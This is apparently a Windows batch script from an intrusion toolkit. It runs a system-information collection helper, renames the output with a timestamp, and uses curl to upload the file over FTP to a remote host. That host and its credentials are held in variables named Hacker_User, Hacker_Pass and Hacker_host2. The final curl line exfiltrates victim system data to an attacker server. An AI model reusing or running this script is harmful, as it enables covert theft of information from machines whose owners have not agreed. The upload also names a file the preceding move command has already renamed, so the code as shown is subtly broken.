@echo on
call %PUB1%\Util\getsysteminfocheck.cmd

set CURDATE=%DATE%
if "%TIME:~0,1%"==" "  GOTO CHECK
set CURTIME=%TIME%
GOTO NEXTOP
:CHECK
set CURTIME=0%TIME:~1,8%
:NEXTOP

set newname2=MySystemInfoCheck-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURTIME:~3,2%%CURTIME:~6,2%.txt
move /Y %PUB1%\Util\MySystemInfoCheck.txt %PUB1%\Util\%newname2%

curl --upload-file %PUB1%\Util\MySystemInfoCheck.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%:%Hacker_port%/webdav/
